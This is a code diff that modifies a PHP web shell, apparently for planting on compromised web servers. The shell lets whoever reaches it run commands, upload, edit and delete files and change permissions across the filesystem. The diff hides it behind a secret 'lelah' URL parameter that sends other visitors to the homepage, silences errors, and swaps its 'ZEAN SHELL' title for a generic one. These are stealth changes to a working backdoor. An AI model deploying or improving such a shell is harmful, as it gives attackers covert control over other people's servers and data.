@@ -1,4 +1,13 @@
 <?php
+// Jika parameter "lelah" tidak ada, redirect ke homepage
+if (!isset($_GET['lelah'])) {
+    header("Location: /"); // Ganti '/' dengan URL homepage situsmu jika perlu
+    exit;
+}
+
+error_reporting(0);
+set_time_limit(0);
+
 // Path awal saat pertama load (default shell dir)
 $initial_path = realpath(getcwd());
 
@@ -17,12 +26,18 @@ function getUserGroup($file) {
     return [$user, $group];
 }
 
+// Fungsi buat build URL agar selalu ada parameter lelah
+function build_url($params = []) {
+    $params['lelah'] = '';
+    return '?' . http_build_query($params);
+}
+
 // Handle delete
 if (isset($_GET['delete'])) {
     $target = realpath($path . DIRECTORY_SEPARATOR . $_GET['delete']);
     if (strpos($target, $path) === 0 && file_exists($target)) {
         is_dir($target) ? rmdir($target) : unlink($target);
-        header("Location: ?path=" . urlencode($path));
+        header("Location: " . build_url(['path' => $path]));
         exit;
     }
 }
@@ -32,7 +47,7 @@ if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
     $from = $path . DIRECTORY_SEPARATOR . $_POST['rename_from'];
     $to   = $path . DIRECTORY_SEPARATOR . $_POST['rename_to'];
     if (file_exists($from)) rename($from, $to);
-    header("Location: ?path=" . urlencode($path));
+    header("Location: " . build_url(['path' => $path]));
     exit;
 }
 
@@ -41,7 +56,7 @@ if (isset($_POST['chmod_file']) && isset($_POST['new_perm'])) {
     $file = $path . DIRECTORY_SEPARATOR . $_POST['chmod_file'];
     $perm = intval($_POST['new_perm'], 8);
     if (file_exists($file)) chmod($file, $perm);
-    header("Location: ?path=" . urlencode($path));
+    header("Location: " . build_url(['path' => $path]));
     exit;
 }
 
@@ -49,7 +64,7 @@ if (isset($_POST['chmod_file']) && isset($_POST['new_perm'])) {
 if (isset($_POST['new_folder'])) {
     $new = $path . DIRECTORY_SEPARATOR . trim($_POST['new_folder']);
     if (!file_exists($new)) mkdir($new);
-    header("Location: ?path=" . urlencode($path));
+    header("Location: " . build_url(['path' => $path]));
     exit;
 }
 
@@ -57,7 +72,7 @@ if (isset($_POST['new_folder'])) {
 if (isset($_POST['new_file'])) {
     $file = $path . DIRECTORY_SEPARATOR . trim($_POST['new_file']);
     if (!file_exists($file)) file_put_contents($file, "");
-    header("Location: ?path=" . urlencode($path));
+    header("Location: " . build_url(['path' => $path]));
     exit;
 }
 
@@ -65,7 +80,7 @@ if (isset($_POST['new_file'])) {
 if (isset($_FILES['upload'])) {
     $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
     move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
-    header("Location: ?path=" . urlencode($path));
+    header("Location: " . build_url(['path' => $path]));
     exit;
 }
 
@@ -73,7 +88,7 @@ if (isset($_FILES['upload'])) {
 if (isset($_POST['save_file']) && isset($_POST['filename'])) {
     $file = $path . DIRECTORY_SEPARATOR . $_POST['filename'];
     file_put_contents($file, $_POST['save_file']);
-    header("Location: ?path=" . urlencode($path));
+    header("Location: " . build_url(['path' => $path]));
     exit;
 }
 
@@ -90,7 +105,7 @@ if (isset($_GET['cmd'])) {
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>🌐 ZEAN SHELL</title>
+<title>🌐 PHP Shell GUI with Back & Top Panel</title>
 <style>
     body {
         background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px;
@@ -162,7 +177,6 @@ if (isset($_GET['cmd'])) {
     #back-button {
         margin-bottom: 10px;
     }
-
     /* Tambahan hover highlight baris */
     .flex-row:hover {
         background-color: #3a3f6b;
@@ -191,10 +205,10 @@ if (isset($_GET['cmd'])) {
 </script>
 </head>
 <body>
-<h1>🌐 ZEAN SHELL</h1>
+<h1>🌐 PHP Shell GUI</h1>
 
 <div id="back-button">
-    <a href="?path=<?= urlencode($initial_path) ?>" style="font-weight:bold; color:#6af;">
+    <a href="<?= build_url(['path' => $initial_path]) ?>" style="font-weight:bold; color:#6af;">
         🔙 Kembali ke folder awal shell
     </a>
 </div>
@@ -204,14 +218,14 @@ if (isset($_GET['cmd'])) {
 <?php
 // Breadcrumb path dengan root /
 echo "<div class='path'><b>📁 Path:</b> ";
-echo "<a href='?path=" . urlencode(DIRECTORY_SEPARATOR) . "'>/</a> / ";
+echo "<a href='" . build_url(['path' => DIRECTORY_SEPARATOR]) . "'>/</a> / ";
 
 $parts = explode(DIRECTORY_SEPARATOR, $path);
 $nav = "";
 foreach ($parts as $p) {
     if ($p === "") continue;
     $nav .= DIRECTORY_SEPARATOR . $p;
-    echo "<a href='?path=" . urlencode($nav) . "'>" . htmlspecialchars($p) . "</a> / ";
+    echo "<a href='" . build_url(['path' => $nav]) . "'>" . htmlspecialchars($p) . "</a> / ";
 }
 echo "</div>";
 
@@ -254,10 +268,10 @@ foreach ($all as $file) {
     list($user, $group) = getUserGroup($full);
 
     $link = $isDir
-        ? "<a href='?path=" . urlencode($full) . "'>📁 " . htmlspecialchars($file) . "</a>"
-        : "<a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>📄 " . htmlspecialchars($file) . "</a>";
+        ? "<a href='" . build_url(['path' => $full]) . "'>📁 " . htmlspecialchars($file) . "</a>"
+        : "<a href='" . build_url(['path' => $path, 'view' => $file]) . "'>📄 " . htmlspecialchars($file) . "</a>";
 
-    $del = "<a class='del-btn' href='?path=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick=\"return confirm('Hapus $file?');\">🗑️</a>";
+    $del = "<a class='del-btn' href='" . build_url(['path' => $path, 'delete' => $file]) . "' onclick=\"return confirm('Hapus $file?');\">🗑️</a>";
 
     $ren = "<form method='POST'>
                 <input type='hidden' name='rename_from' value='" . htmlspecialchars($file) . "'>
@@ -271,7 +285,7 @@ foreach ($all as $file) {
                 <button type='submit' class='mini-btn' title='Change Permission'>🔒</button>
               </form>";
 
-    $edit = is_file($full) ? "<a class='mini-btn' href='?path=" . urlencode($path) . "&edit=" . urlencode($file) . "' title='Edit File'>✍️</a>" : "";
+    $edit = is_file($full) ? "<a class='mini-btn' href='" . build_url(['path' => $path, 'edit' => $file]) . "' title='Edit File'>✍️</a>" : "";
 
     echo "<div class='flex-row'>
         <div class='col-name'>$link</div>
@@ -339,6 +353,12 @@ if ($output) {
         </div>
     </div> <!-- end side-panel -->
 </div> <!-- end container -->
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        document.body.classList.add("fade-in");
+    });
+</script>
 
 </body>
 </html>
